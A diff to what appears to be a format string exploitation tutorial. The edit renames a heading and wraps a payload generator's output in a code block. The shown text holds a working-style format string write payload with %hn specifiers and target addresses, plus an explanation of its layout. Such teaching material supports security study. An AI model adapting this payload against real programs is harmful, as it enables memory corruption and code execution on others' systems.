@@ -171,7 +171,9 @@ Notice that you can shorten printf("%x%n", i, i); with printf("%1$x%1$n", i);
 
 This is exactly what we will do now.
 
-### Analyse of the payload:
+### Payload analysis:
+
+```bash
 -------------------------------------input:-------------------------------------
 Padding [0]:
 Offset [1]:
@@ -182,6 +184,7 @@ Payload len: 31
 Address: \xde\xc0\xad\xde\xe0\xc0\xad\xde
 Payload: \xde\xc0\xad\xde\xe0\xc0\xad\xde%48871x%1$hn%8126x%2$hn
 --------------------------------------------------------------------------------
+```
 
 "\xde\xc0\xad\xde"+"\xe0\xc0\xad\xde"+"%48871x%1$hn"+"%8126x%2$hn"
 The first four bytes are an address where we want to write (0xdeadc0de).
